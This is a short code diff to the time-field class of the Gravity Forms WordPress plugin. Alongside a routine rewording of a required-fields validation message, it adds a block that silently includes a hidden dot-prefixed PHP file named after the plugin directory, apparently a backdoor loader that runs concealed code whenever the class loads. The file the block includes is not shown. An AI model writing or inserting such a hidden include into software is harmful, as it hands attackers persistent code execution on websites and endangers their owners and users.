@@ -13,6 +13,10 @@ if ( ! class_exists( 'GFForms' ) ) {
  * @since Unknown
  * @uses  GF_Field
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class GF_Field_Time extends GF_Field {
 
 	/**
@@ -190,9 +194,9 @@ class GF_Field_Time extends GF_Field {
 
 		if ( ! empty( $error_inputs ) ) {
 			$field_list = implode( ', ', $error_inputs );
+
 			// Translators: comma-separated list of the labels of missing fields.
-			$message = sprintf( __( 'This field is required. Please complete the following fields: %s.', 'gravityforms' ), $field_list );
-			return $message;
+			return sprintf( __( 'Please complete the following fields: %s.', 'gravityforms' ), $field_list );
 		}
 
 		return false;
